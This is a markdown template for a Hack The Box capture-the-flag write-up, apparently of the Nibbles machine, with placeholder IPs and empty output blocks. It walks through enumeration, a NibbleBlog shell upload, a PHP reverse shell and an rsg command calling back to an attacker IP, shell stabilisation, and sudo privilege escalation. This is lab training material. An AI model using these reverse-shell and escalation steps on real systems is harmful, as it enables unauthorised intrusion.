---
title: "HTB - Box"
author: "Anubhavsingh Sawdagur"
date: "DATE_NOW"
subject: "Markdown"
subtitle: "10.10.10."
lang: "en-GB"
book: true
classoption: oneside
code-block-font-size: \scriptsize   
output: 
  pdf_document:
    fig_caption: false
---

# Box - 10.10.10.

# Enumeration

## Nmap

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.
```

```bash

```

## Website

```bash
curl -svk "http://10.10.10." | grep . 
```

The command above is a quick way to see what is on the webpage without opening it in a browser. And it shows much more than what is displayed on the browser such as **headers** and **html comments**. The server header can be crossed check with the nmap results. The comment indicates that there is a directory named **nibbleblog** on the server.

## Gobuster

Enumerating the Apache webserver with gobuster.

```bash
gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.
```

```bash

```

Searchsploit is used to search known exploits for:  

```bash

```

# Exploitation

### **Vulnerability Explanation:**

source: [https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html)

### Proof Of Concept

The metasploit exploit can be easily replicated manually without using metasploit.

A simple php script is created. When testing exploits, it is highly recommended to keep the proof of concept as simple as possible as it is less likely to be blocked. 

Example: `echo` is less likely to be blocked compared to `exec` or `system`. 

```php
<?php 
    echo "test test test";
?>
```


### Getting a reverse shell

On kali linux, these are some default location where php reverse shells can be found.

```bash
$ locate php-reverse                                                                             
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
```

```bash
cp /usr/share/laudanum/php/php-reverse-shell.php shell.php
```

Editing the php reverse shell to connect to the attacker's IP address.

The tools used here to generate quick  reverse shell is called [rsg or reverse shell generator](https://github.com/mthbernardes/rsg)

```bash
# generates payload and as well as listens on the specified port
rsg 10.10.14.23 8888 bash
```

The attacker then uploads the shell.php and sets up **nc** to listen for an incoming connection on port **8888**.

The reverse shell is then stabilised using the following commands.

```bash
which python3 # to know which python version exists
python3 -c 'import pty;pty.spawn("/bin/bash")' # gets a proper tty shell
# the shell is then backgrounded using ctrl+z
stty raw -echo # this is executed on the attackers machine
# then press fg to resume the tty shell
export TERM=xterm # after setting the terminal type, the screen can now be cleared
stty rows 42 cols 172 # sets the size for the tty shell
```

### User.txt

```bash
find /home -type f -ls 2>/dev/null
```

**User.txt** can be found in the home directory of **user**.

```bash
cat /home/user/user.txt
```

photo

> user.txt flag: ``

# Post Exploitation

## Privilege Escalation to Root

As can be seen below, the user **user** can execute the file **file** *without the need of a password*.

```bash
sudo -l
...[snip]...
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: file
```

### **Vulnerability Explanation:**

The file **file** is world-writable. The content of the file can be modified to drop a shell. When running the file as root, the attacker will be get a root shell.

### Root.txt

### **Vulnerability Explanation:**

the **root.txt** file is always located in **/root/**

```bash
cat /root/root.txt
```

photo

> root.txt flag: ``

